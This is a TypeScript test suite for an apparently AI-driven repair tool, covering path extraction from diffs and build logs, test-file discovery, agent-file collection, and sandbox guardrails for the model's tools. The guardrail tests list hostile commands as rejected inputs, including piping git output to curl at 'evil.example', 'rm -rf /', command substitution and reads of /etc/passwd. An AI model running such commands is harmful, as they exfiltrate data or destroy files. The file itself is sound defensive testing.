import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import {
    generateRepairProposals,
    extractFilePathsFromDiff,
    extractFilePathsFromLogs,
    getFullFileContexts,
    collectAgentFiles,
    getAgentFilesContext,
    isTestFilePath,
    findSiblingTestFiles,
    getSiblingTestContexts,
    findFileInWorkspaceByBasename,
    isPathInsideWorkspace,
    isCommandAllowed,
    sanitizeRelativePath,
    createJanitorTools,
    summarizeToolSteps,
    buildFinalizationPrompt,
    TOOL_TRANSCRIPT_LIMIT,
} from './ai.js';

describe('ai module test suite', () => {

    describe('summarizeToolSteps() & buildFinalizationPrompt()', () => {
        it('renders tool calls and their output as a replayable transcript', () => {
            const transcript = summarizeToolSteps([
                {
                    toolCalls: [{ toolName: 'run_command', input: { command: 'ls -la' } }],
                    toolResults: [{ toolName: 'run_command', output: 'total 0' }],
                },
            ]);
            assert.match(transcript, /run_command\({"command":"ls -la"}\)/);
            assert.match(transcript, /run_command returned:\ntotal 0/);
        });

        it('returns an empty transcript for missing or empty steps', () => {
            assert.equal(summarizeToolSteps(undefined), '');
            assert.equal(summarizeToolSteps([]), '');
        });

        it('truncates an oversized transcript instead of resending it whole', () => {
            const steps = [{ toolResults: [{ toolName: 'read_file', output: 'x'.repeat(TOOL_TRANSCRIPT_LIMIT * 2) }] }];
            const transcript = summarizeToolSteps(steps);
            assert.ok(transcript.length < TOOL_TRANSCRIPT_LIMIT * 2);
            assert.match(transcript, /tool transcript truncated/);
        });

        it('tells the model to answer now and replays the transcript when there is one', () => {
            const withTools = buildFinalizationPrompt('ORIGINAL', 'TRANSCRIPT');
            assert.match(withTools, /^ORIGINAL/);
            assert.match(withTools, /TRANSCRIPT/);
            assert.match(withTools, /no tools available/);

            const without = buildFinalizationPrompt('ORIGINAL', '');
            assert.match(without, /^ORIGINAL/);
            assert.doesNotMatch(without, /inspection you already performed/);
        });
    });

    describe('generateRepairProposals() & file context extraction', () => {
        it('is defined as an async function', () => {
            assert.equal(typeof generateRepairProposals, 'function');
        });

        it('extracts file paths accurately from git diff output', () => {
            const mockDiff = `
diff --git a/src/auth/handlers.rs b/src/auth/handlers.rs
index 123456..789012 100644
--- a/src/auth/handlers.rs
+++ b/src/auth/handlers.rs
@@ -10,3 +10,3 @@
diff --git a/src/routes/sync.rs b/src/routes/sync.rs
`;
            const paths = extractFilePathsFromDiff(mockDiff);
            assert.deepEqual(paths, ['src/auth/handlers.rs', 'src/routes/sync.rs']);
        });

        it('extracts file paths accurately from compiler build logs', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-logs-test-'));
            try {
                fs.mkdirSync(path.join(tempDir, 'src', 'auth'), { recursive: true });
                fs.mkdirSync(path.join(tempDir, 'src', 'routes'), { recursive: true });
                fs.writeFileSync(path.join(tempDir, 'src', 'auth', 'handlers.rs'), '// mock');
                fs.writeFileSync(path.join(tempDir, 'src', 'routes', 'sync.rs'), '// mock');

                const mockLogs = `
error[E0425]: cannot find value \`foo\` in this scope
  --> src/auth/handlers.rs:120:5
error: failed to compile
  --> src/routes/sync.rs:45:12
`;
                const paths = extractFilePathsFromLogs(mockLogs, tempDir);
                assert.deepEqual(paths, ['src/auth/handlers.rs', 'src/routes/sync.rs']);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('resolves file paths from logs via workspace basename search when candidate path is partial', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-fuzzy-logs-'));
            try {
                const deepPath = path.join(tempDir, 'apps', 'scribble-box', 'src', 'main', 'java', 'com', 'scribbleroute', 'scribblebox', 'games', 'scribblepuzzle');
                fs.mkdirSync(deepPath, { recursive: true });
                fs.writeFileSync(path.join(deepPath, 'ScribblePuzzleViewModel.kt'), '// class ScribblePuzzleViewModel');

                const mockLogs = `
Unresolved reference: ScribblePuzzleViewModel in ScribblePuzzleViewModel.kt: (12, 34)
`;
                const paths = extractFilePathsFromLogs(mockLogs, tempDir);
                assert.equal(paths.length, 1);
                assert.equal(paths[0].replace(/\\/g, '/'), 'apps/scribble-box/src/main/java/com/scribbleroute/scribblebox/games/scribblepuzzle/ScribblePuzzleViewModel.kt');
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('finds file in workspace by basename', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-find-base-'));
            try {
                const deepPath = path.join(tempDir, 'pkg', 'sub', 'deep');
                fs.mkdirSync(deepPath, { recursive: true });
                fs.writeFileSync(path.join(deepPath, 'TargetFile.kt'), '// content');

                const relPath = findFileInWorkspaceByBasename(tempDir, 'TargetFile.kt');
                assert.equal(relPath?.replace(/\\/g, '/'), 'pkg/sub/deep/TargetFile.kt');

                const missing = findFileInWorkspaceByBasename(tempDir, 'NonExistent.kt');
                assert.equal(missing, null);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('reads full file contexts for valid file paths', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-file-ctx-'));
            try {
                const subDir = path.join(tempDir, 'src', 'auth');
                fs.mkdirSync(subDir, { recursive: true });
                const filePath = path.join(subDir, 'handlers.rs');
                fs.writeFileSync(filePath, 'fn main() { println!("hello"); }', 'utf-8');

                const contexts = getFullFileContexts(['src/auth/handlers.rs'], tempDir);
                assert.match(contexts, /--- File: src\/auth\/handlers\.rs \(Full Content\) ---/);
                assert.match(contexts, /println!\("hello"\)/);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });
    });

    describe('isTestFilePath(), findSiblingTestFiles() & getSiblingTestContexts()', () => {
        it('recognizes language-idiomatic test file names', () => {
            assert.equal(isTestFilePath('scripts/ai.test.ts'), true);
            assert.equal(isTestFilePath('internal/store/store_test.go'), true);
            assert.equal(isTestFilePath('app/models/user_spec.rb'), true);
            assert.equal(isTestFilePath('src/test/java/com/acme/UserServiceTest.kt'), true);
            assert.equal(isTestFilePath('pkg/utils/test_helpers.py'), true);
            assert.equal(isTestFilePath('components/Button.spec.tsx'), true);
            assert.equal(isTestFilePath('scripts/ai.ts'), false);
            assert.equal(isTestFilePath('internal/store/store.go'), false);
            assert.equal(isTestFilePath(''), false);
        });

        it('recognizes source files living inside conventional test directories', () => {
            assert.equal(isTestFilePath('tests/integration/login.rs'), true);
            assert.equal(isTestFilePath('src/__tests__/render.tsx'), true);
            assert.equal(isTestFilePath('tests/fixtures/data.json'), false);
            assert.equal(isTestFilePath('src/latest/api.ts'), false);
        });

        it('prefers the counterpart test file, then same-directory siblings', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-sibling-'));
            try {
                const srcDir = path.join(tempDir, 'internal', 'store');
                fs.mkdirSync(srcDir, { recursive: true });
                fs.writeFileSync(path.join(srcDir, 'store.go'), 'package store');
                fs.writeFileSync(path.join(srcDir, 'store_test.go'), 'package store // counterpart');
                fs.writeFileSync(path.join(srcDir, 'cache_test.go'), 'package store // neighbour');

                const found = findSiblingTestFiles(['internal/store/store.go'], tempDir);
                assert.deepEqual(found, ['internal/store/store_test.go', 'internal/store/cache_test.go']);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('ranks counterparts of every changed file ahead of unrelated neighbours', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-sibling-multi-'));
            try {
                const srcDir = path.join(tempDir, 'scripts');
                fs.mkdirSync(srcDir, { recursive: true });
                for (const name of ['ai', 'pr', 'config', 'git']) {
                    fs.writeFileSync(path.join(srcDir, `${name}.ts`), `export const ${name} = 1;`);
                    fs.writeFileSync(path.join(srcDir, `${name}.test.ts`), `// ${name} suite`);
                }

                const found = findSiblingTestFiles(['scripts/ai.ts', 'scripts/pr.ts'], tempDir, 2);
                assert.deepEqual(found.sort(), ['scripts/ai.test.ts', 'scripts/pr.test.ts']);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('finds tests in mirrored JVM source roots and nested test directories', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-sibling-jvm-'));
            try {
                const mainDir = path.join(tempDir, 'app', 'src', 'main', 'java', 'com', 'acme');
                const testDir = path.join(tempDir, 'app', 'src', 'test', 'java', 'com', 'acme');
                fs.mkdirSync(mainDir, { recursive: true });
                fs.mkdirSync(testDir, { recursive: true });
                fs.writeFileSync(path.join(mainDir, 'UserService.kt'), 'class UserService');
                fs.writeFileSync(path.join(testDir, 'UserServiceTest.kt'), 'class UserServiceTest');

                const found = findSiblingTestFiles(['app/src/main/java/com/acme/UserService.kt'], tempDir);
                assert.deepEqual(found, ['app/src/test/java/com/acme/UserServiceTest.kt']);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('excludes the changed files themselves and honors the file cap', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-sibling-cap-'));
            try {
                const srcDir = path.join(tempDir, 'src');
                fs.mkdirSync(srcDir, { recursive: true });
                fs.writeFileSync(path.join(srcDir, 'index.ts'), 'export const a = 1;');
                for (const name of ['a', 'b', 'c', 'd']) {
                    fs.writeFileSync(path.join(srcDir, `${name}.test.ts`), `// ${name}`);
                }

                const found = findSiblingTestFiles(['src/index.ts', 'src/a.test.ts'], tempDir, 2);
                assert.equal(found.length, 2);
                assert.equal(found.includes('src/a.test.ts'), false);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('falls back to any repository test file when nothing sits near the change', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-sibling-fallback-'));
            try {
                fs.mkdirSync(path.join(tempDir, 'src', 'deep', 'nested'), { recursive: true });
                fs.mkdirSync(path.join(tempDir, 'other'), { recursive: true });
                fs.writeFileSync(path.join(tempDir, 'src', 'deep', 'nested', 'thing.ts'), 'export const x = 1;');
                fs.writeFileSync(path.join(tempDir, 'other', 'legacy.test.ts'), '// legacy suite');

                const found = findSiblingTestFiles(['src/deep/nested/thing.ts'], tempDir);
                assert.deepEqual(found, ['other/legacy.test.ts']);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('formats sibling tests as labeled prompt context and returns empty string when none exist', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-sibling-ctx-'));
            try {
                const srcDir = path.join(tempDir, 'scripts');
                fs.mkdirSync(srcDir, { recursive: true });
                fs.writeFileSync(path.join(srcDir, 'ai.ts'), 'export const ai = 1;');
                assert.equal(getSiblingTestContexts(['scripts/ai.ts'], tempDir), '');

                fs.writeFileSync(path.join(srcDir, 'ai.test.ts'), "import { describe } from 'node:test';");
                const context = getSiblingTestContexts(['scripts/ai.ts'], tempDir);
                assert.match(context, /--- File: scripts\/ai\.test\.ts \(Existing Test File\) ---/);
                assert.match(context, /import \{ describe \} from 'node:test';/);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('truncates oversized sibling test files', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-sibling-trunc-'));
            try {
                fs.writeFileSync(path.join(tempDir, 'index.js'), 'module.exports = {};');
                fs.writeFileSync(path.join(tempDir, 'index.test.js'), 'x'.repeat(500));

                const context = getSiblingTestContexts(['index.js'], tempDir, 5, 100);
                assert.match(context, /\.\.\. \[truncated\]/);
                assert.ok(context.length < 400);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });
    });

    describe('collectAgentFiles() & getAgentFilesContext()', () => {
        it('discovers AGENTS.md and .agents files across repository', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-agent-files-'));
            try {
                fs.writeFileSync(path.join(tempDir, 'AGENTS.md'), '# Root Agent Rules\nFocus on cleanliness.');
                fs.mkdirSync(path.join(tempDir, '.agents', 'rules'), { recursive: true });
                fs.writeFileSync(path.join(tempDir, '.agents', 'rules', 'style.md'), 'Prefer explicit types.');
                fs.mkdirSync(path.join(tempDir, 'src'), { recursive: true });
                fs.writeFileSync(path.join(tempDir, 'src', 'index.ts'), 'console.log("hello");');

                const collected = collectAgentFiles(tempDir);
                assert.ok(collected.includes('AGENTS.md'));
                assert.ok(collected.includes('.agents/rules/style.md'));
                assert.equal(collected.includes('src/index.ts'), false);

                const context = getAgentFilesContext(tempDir);
                assert.match(context, /--- File: AGENTS\.md \(Agent Context\) ---/);
                assert.match(context, /Focus on cleanliness/);
                assert.match(context, /--- File: \.agents\/rules\/style\.md \(Agent Context\) ---/);
                assert.match(context, /Prefer explicit types/);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('discovers CLAUDE.md, GEMINI.md, and .cursorrules files', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-agent-other-'));
            try {
                fs.writeFileSync(path.join(tempDir, 'CLAUDE.md'), '# Claude guide');
                fs.writeFileSync(path.join(tempDir, '.cursorrules'), 'Cursor instructions');

                const collected = collectAgentFiles(tempDir);
                assert.ok(collected.includes('CLAUDE.md'));
                assert.ok(collected.includes('.cursorrules'));
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('returns empty string when no agent files are present', () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-agent-none-'));
            try {
                fs.writeFileSync(path.join(tempDir, 'main.ts'), 'export const x = 1;');
                const collected = collectAgentFiles(tempDir);
                assert.equal(collected.length, 0);

                const context = getAgentFilesContext(tempDir);
                assert.equal(context, '');
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });
    });

    describe('LLM Tools & Workspace Guardrails', () => {
        it('validates workspace path boundaries correctly', () => {
            const workDir = process.cwd();
            assert.equal(isPathInsideWorkspace(workDir, 'src/main.ts'), true);
            assert.equal(isPathInsideWorkspace(workDir, './package.json'), true);
            assert.equal(isPathInsideWorkspace(workDir, '../outside.txt'), false);
        });

        it('rejects sibling directories that merely share a prefix with the workspace root', () => {
            // e.g. workDir "/repo/foo" must not treat "/repo/foobar/secret" as inside.
            const workDir = path.join(os.tmpdir(), 'janitor-boundary-foo');
            const siblingPath = path.join(os.tmpdir(), 'janitor-boundary-foobar', 'secret.txt');
            const relativeFromWorkDir = path.relative(workDir, siblingPath);
            assert.equal(isPathInsideWorkspace(workDir, relativeFromWorkDir), false);
        });

        it('filters allowed vs disallowed shell commands', () => {
            assert.equal(isCommandAllowed('ls -la'), true);
            assert.equal(isCommandAllowed('git status'), true);
            assert.equal(isCommandAllowed('git log -n 5'), true);
            assert.equal(isCommandAllowed('cat src/index.ts'), true);
            assert.equal(isCommandAllowed('find . -name "*.ts"'), true);
            assert.equal(isCommandAllowed('git ls-files --stage run_tests.sh'), true);

            assert.equal(isCommandAllowed('rm -rf /'), false);
            assert.equal(isCommandAllowed('git push origin main'), false);
            assert.equal(isCommandAllowed('cat src/index.ts > file.txt'), false);
            assert.equal(isCommandAllowed('ls; rm -rf .'), false);
        });

        it('rejects command chaining and substitution operators beyond ";" and ">"', () => {
            assert.equal(isCommandAllowed('git status && curl evil.example'), false);
            assert.equal(isCommandAllowed('git log | curl -d @- evil.example'), false);
            assert.equal(isCommandAllowed('cat `whoami`'), false);
            assert.equal(isCommandAllowed('cat $(whoami)'), false);
            assert.equal(isCommandAllowed('cat src/index.ts < /etc/passwd'), false);
        });

        it('sanitizeRelativePath normalizes safe paths and rejects traversal attempts', () => {
            const workDir = process.cwd();
            assert.equal(sanitizeRelativePath(workDir, './src/main.ts'), 'src/main.ts');
            assert.equal(sanitizeRelativePath(workDir, '/src/main.ts'), 'src/main.ts');
            assert.equal(sanitizeRelativePath(workDir, 'src/main.ts'), 'src/main.ts');

            assert.equal(sanitizeRelativePath(workDir, '../../etc/passwd'), null);
            assert.equal(sanitizeRelativePath(workDir, '../outside.txt'), null);
            assert.equal(sanitizeRelativePath(workDir, ''), null);
        });

        it('executes read_file tool with logging and output truncation', async () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-tool-read-'));
            try {
                const samplePath = path.join(tempDir, 'sample.txt');
                const content = 'a'.repeat(45000);
                fs.writeFileSync(samplePath, content);

                const tools = createJanitorTools(tempDir);
                assert.ok(tools && tools.read_file);

                const res = await tools.read_file.execute({ filePath: 'sample.txt' }, { messages: [], toolCallId: '1', context: {} });
                assert.match(res as string, /\[truncated 5000 characters\. Max file output limit is 40,000 characters\]/);

                const denRes = await tools.read_file.execute({ filePath: '../outside.txt' }, { messages: [], toolCallId: '2', context: {} });
                assert.match(denRes as string, /Access denied/);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('executes list_directory tool with entry limits', async () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-tool-dir-'));
            try {
                for (let i = 0; i < 110; i++) {
                    fs.writeFileSync(path.join(tempDir, `file_${i}.txt`), 'test');
                }

                const tools = createJanitorTools(tempDir);
                assert.ok(tools && tools.list_directory);

                const res = await tools.list_directory.execute({ dirPath: '.' }, { messages: [], toolCallId: '3', context: {} });
                assert.match(res as string, /Max directory output limit is 100 entries/);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });

        it('executes run_command tool for allowed commands and rejects disallowed ones', async () => {
            const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'janitor-tool-cmd-'));
            try {
                fs.writeFileSync(path.join(tempDir, 'hello.txt'), 'hello world');

                const tools = createJanitorTools(tempDir);
                assert.ok(tools && tools.run_command);

                const okRes = await tools.run_command.execute({ command: 'git status' }, { messages: [], toolCallId: '4', context: {} });
                assert.ok(typeof okRes === 'string');

                const badRes = await tools.run_command.execute({ command: 'rm -rf .' }, { messages: [], toolCallId: '5', context: {} });
                assert.match(badRes as string, /Command "rm -rf \." is not allowed/);
            } finally {
                fs.rmSync(tempDir, { recursive: true, force: true });
            }
        });
    });

});
